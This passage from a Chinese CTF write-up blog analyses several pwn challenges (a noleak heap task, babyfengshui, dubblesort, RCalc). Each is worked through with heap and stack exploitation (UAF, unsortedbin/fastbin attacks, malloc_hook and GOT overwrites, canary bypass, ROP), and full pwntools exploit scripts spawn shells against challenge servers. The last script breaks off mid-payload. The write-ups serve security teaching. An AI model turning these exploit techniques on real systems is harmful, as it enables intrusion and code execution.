<h4 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h4><p>首先，附件已经提示，<strong>程序是在glibc 2.23下的。</strong></p>
<p>程序是一个自定义的堆管理，实现了添加、删除和更新功能。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222162245601.png" alt="image-20201222162245601"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222162413637.png" alt="image-20201222162413637"></p>
<p>其中漏洞出现再删除和更新上，如图注释所示。由于删除没有置null，存在UAF漏洞，更新存在堆溢出漏洞。</p>
<h4 id="思路及利用-15"><a href="#思路及利用-15" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>由于为<code> Full RELRO</code>，不能更改got表。</p>
<p>整个程序没有输出的选项，也就无法泄露地址（noleak）</p>
<p>而存在UAF漏洞，是可以做到任意地址写的，所以考虑是修改hook函数，将<strong>__malloc_hook</strong>函数修改，这样调用malloc时就会调用 malloc_hook里的指针。</p>
<p>想要修改malloc_hook我们就想到了unsortedbin attack。因为一般来讲，malloc_hook与unsordtedbin相隔不远。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222202509095.png" alt="image-20201222202509095"></p>
<p>程序通过一个在bss段的全局数组管理堆，目标就是通过unsortedbin attack将__malloc_hook的地址写入到这个全局数组上。</p>
<p>为了达成这一目标，首先要是使用unsortedbin attack将unsortedbin的地址写入bss段，然后将最后的俩位从78改为10.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortedbin attack</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x601060</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222205731171.png" alt="image-20201222205731171"></p>
<p>程序并没有开启堆栈不可知性，可以将shellcode写入bss段，然后就是将__malloc_hook里的指针指向写入的shellcoed就可以得到shell。</p>
<p>接下来就是考虑如何修改的问题，由于之前使用了unsortedbin attack，破坏了unsortedbin的结构，因此这里使用fastbinattack，申请chunk即在全局数组，然后通过修改数组的值，借助update函数，将78改为10。</p>
<p>而使用fastbinattack，需要绕过size检查，可以借助写入的7f，这里需要计算一下偏移让伪造的size位为7f。也就是从0x60106d开始。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">1</span>, <span class="number">8</span>, p64(<span class="number">0x60106d</span>))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222211533132.png" alt="image-20201222211533132"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222211642972.png" alt="image-20201222211642972"></p>
<p>然后就是申请0x60大小的chunk，之后我们在数组索引为8，9的位置分别写入了存储泄露出的地址的<code>0x601070</code>和指针数组的开头<code>0x601040</code>，方便我们接下来写入shellcode.</p>
<p><code>new(0x60,b&#39;\x00&#39;*3+p64(0x601070)+p64(0x601040))</code><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222212109392.png" alt="image-20201222212109392"></p>
<p>这样就可以通过修改数组8，改78为10，然后修改数组6（0x601070）为输入的shellcode（数组开端），通过修改数组9，将shellcode写入bss段（从0x601040开始）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update(<span class="number">8</span>, <span class="number">1</span>, <span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">6</span>, <span class="number">8</span>, p64(<span class="number">0x601040</span>))</span><br><span class="line">update(<span class="number">9</span>, <span class="number">256</span>, asm(shellcraft.amd64.sh()))</span><br></pre></td></tr></table></figure>

<p>最后调用malloc就可以得到shell。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222212557359.png" alt="image-20201222212557359"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./timu&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node3.buuoj.cn&quot;,28605)</span></span><br><span class="line"><span class="comment"># p = remote(&quot;220.249.52.134&quot;,58955)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x601060</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">1</span>, <span class="number">8</span>, p64(<span class="number">0x60106d</span>))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0x601070</span>)+p64(<span class="number">0x601040</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update(<span class="number">8</span>, <span class="number">1</span>, <span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">6</span>, <span class="number">8</span>, p64(<span class="number">0x601040</span>))</span><br><span class="line">update(<span class="number">9</span>, <span class="number">256</span>, asm(shellcraft.amd64.sh()))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="20-babyfengshui"><a href="#20-babyfengshui" class="headerlink" title="20. babyfengshui"></a>20. babyfengshui</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222220954444.png" alt="image-20201222220954444"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222221013962.png" alt="image-20201222221013962"></p>
<h4 id="代码分析-16"><a href="#代码分析-16" class="headerlink" title="代码分析"></a>代码分析</h4><p>程序实现了添加新用户、删除、更改等操作。</p>
<p>其结构如图所示：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222222940532.png" alt="image-20201222222940532"></p>
<p>一般来讲，申请的chunk是相邻的。</p>
<p>漏洞出现在更改上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222221324550.png" alt="image-20201222221324550"></p>
<p>这里是一个检查溢出的判断，可以从结构图就可以看出，这种溢出检验是基于两个chunk是紧邻的。如果一个用户的两个chunk不相邻，且desc在node的前面，就可以做到溢出。</p>
<h4 id="思路及利用-16"><a href="#思路及利用-16" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>接下的问题就是如何将一个用户的两个chunk分开。</p>
<p>先申请三个一样大小（0x80）的用户，删除用户0，unlink会有一个0x100的空闲块，再申请用户3，大小0x100，就将用户3的node与desc分开。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222223555039.png" alt="image-20201222223555039"></p>
<p>然后使用溢出，修改用户1node的description指针为free的got，先泄露地址，再修改为system。最后调用free，得到shell。这里将用户2的description写为“/bin/sh\x00”</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">54735</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,length,text</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;description: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;name: &quot;</span>,<span class="string">&#x27;ffff&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;text: &quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">updata</span>(<span class="params">index,length,text</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;text: &quot;</span>,text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x198</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x19C</span>,payload)</span><br><span class="line"></span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;free&quot;</span>,free_addr) </span><br><span class="line">offset = free_addr - libc.dump(<span class="string">&quot;free&quot;</span>) </span><br><span class="line">system_addr = offset + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">updata(<span class="number">1</span>,<span class="number">4</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222224732060.png" alt="image-20201222224732060"></p>
<h3 id="21-dubblesort"><a href="#21-dubblesort" class="headerlink" title="21. dubblesort"></a>21. dubblesort</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223081129516.png" alt="image-20201223081129516"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223081203985.png" alt="image-20201223081203985"></p>
<h4 id="代码分析-17"><a href="#代码分析-17" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223082332571.png" alt="image-20201223082332571"></p>
<p>程序的功能是实现一个排序，漏洞主要出现如图所示的两个位置。</p>
<p>没有调用memset对buf清空，里面可能有敏感数据。对输入的整数个数没有上限限制，可以造成栈溢出。</p>
<h4 id="思路及利用-17"><a href="#思路及利用-17" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>首先查看buf里的数据，发现<code>_GLOBAL_OFFSET_TABLE_</code>。可以据此算出libc基址，进而得到system函数地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223082737721.png" alt="image-20201223082737721"></p>
<p><code> 0xffffcee0-0xffffcec8=24</code>也就是说，只要输入24个字符，就顺带输出<code>_GLOBAL_OFFSET_TABLE_</code>。</p>
<p>然后考虑栈溢出，canary保护开启，需要泄露或绕过。</p>
<p>显然这个程序中泄露是不可行的，而sacnf的特性能帮助我们绕过canary。</p>
<p>当 scanf 函数接收到不符合格式化字符串的字符时，不会将其放入栈空间中。所以可以在canary处输入<code>+、—</code>等字符绕过canary。</p>
<p><code>_GLOBAL_OFFSET_TABLE_</code>与libc的基址的偏移固定，需要先算出来。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091146979.png" alt="image-20201223091146979">可以知道v12处是canary。</p>
<p>因此，我们先输入(0x70-0x10)/4 = 24个整数，然后接下来输入+或-号，跳过当前输入，然后我们到达ebp-0xC处，距离返回地址ebp+0x4还差0x10/4=4个，因此，我们继续输入4个整数，接下来，我们再输入ROP即可。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./dubblesort&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;./libc_32.so.6&quot;</span>&#125;)  </span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>, <span class="number">49887</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)  </span><br><span class="line">off = <span class="number">0x1AE244</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#泄露地址并计算出libc的地址  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x1C</span>  </span><br><span class="line">sh.sendafter(<span class="string">&#x27;name :&#x27;</span>,payload)  </span><br><span class="line">sh.recvuntil(payload)  </span><br><span class="line"><span class="comment">#计算libc加载地址  </span></span><br><span class="line">libc_base = u32(sh.recv(<span class="number">4</span>)) - off  </span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)  </span><br><span class="line">  </span><br><span class="line">n = <span class="number">35</span>  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;sort :&#x27;</span>,<span class="built_in">str</span>(n))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n<span class="number">-11</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))  </span><br><span class="line">  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="string">&#x27;+&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(system_addr))  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(binsh_addr))  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091348996.png" alt="image-20201223091348996"></p>
<h3 id="22-RCalc"><a href="#22-RCalc" class="headerlink" title="22. RCalc"></a>22. RCalc</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091552374.png" alt="image-20201223091552374"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091611277.png" alt="image-20201223091611277"></p>
<h4 id="代码分析-18"><a href="#代码分析-18" class="headerlink" title="代码分析"></a>代码分析</h4><p>整个程序模拟了一个计算器。</p>
<p>程序开始，申请了两个堆，且没有free，结合之后的代码可以知道，一个是0x100的存储数据的堆，一个是0x320的存储自定义的canary的堆。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093330611.png" alt="image-20201223093330611"></p>
<p>向canary中写入随机数，和读取canary中的值，</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093513368.png" alt="image-20201223093513368"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093614793.png" alt="image-20201223093614793"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093659464.png" alt="image-20201223093659464"></p>
<p>与canary的值不一样说明有溢出，报错。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093802866.png" alt="image-20201223093802866">这里没有限制输入，是可以做到栈溢出的。</p>
<p>没有对堆上的存储做限制。是可以不断存储数据覆盖canary的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223094116027.png" alt="image-20201223094116027"></p>
<h4 id="思路及分析"><a href="#思路及分析" class="headerlink" title="思路及分析"></a>思路及分析</h4><p>这道题实际上的思路和常规的有canary的栈溢出题目一样，覆盖或是泄露canary值然后就是常规的栈溢出、rop攻击。</p>
<p>不同的是这里的canary是自定义的，在一个堆中。但是上述分析可以看到，save和canary两个堆是连续申请的且没有free，也就是说这两个堆是连续的，而且并没有对向save堆写入数据有任何限制，是可以做到堆溢出的。</p>
<p>接下来就是计算需要save多少次数据才可以覆盖canary。动态调试，找到save和canary对应的堆。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223094827128.png" alt="image-20201223094827128"></p>
<p>之前差值为<code>（ 0x6033b0-0x6032a0）/8=34</code>，也就是说存储34次就能覆盖掉canary。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setcanary</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;input 2 integer: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Save the result? &#x27;</span>, <span class="string">&#x27;yes&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样就能将canary覆盖为0，接下来就是栈溢出rop的常规操作。</p>
<p>先泄露地址，得到基地址，找到system。需要一个传参用的gadget，<code>pop rdi ，ret</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223095301158.png" alt="image-20201223095301158"></p>
<p>编写exp：</p>
<p><strong>需要注意的是，libc版本问题</strong>，如果出现如图的情况说明版本不对，地址对不上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223112047972.png" alt="image-20201223112047972"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io=process(<span class="string">&quot;./RCalc&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">44237</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.23-0ubuntu10_amd64.so&#x27;</span>)</span><br><span class="line">puts_plt = <span class="number">0x400850</span></span><br><span class="line">__libc_start_main_ = <span class="number">0x601FF0</span></span><br><span class="line"></span><br><span class="line">rdi_ret = <span class="number">0x0000000000401123</span></span><br><span class="line">main_addr = <span class="number">0x0000000000401036</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pass_canary</span>(<span class="params">k</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>+k):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;input 2 integer: &quot;</span>)</span><br><span class="line">        io.send(<span class="string">&quot;0\n0\n&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Save the result? &quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">        <span class="comment">#sleep(0.2)</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload+=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x110</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rdi_ret)</span><br><span class="line">    payload+=p64(__libc_start_main_)</span><br><span class="line">    payload+=p64(puts_plt)</span><br><span class="line">    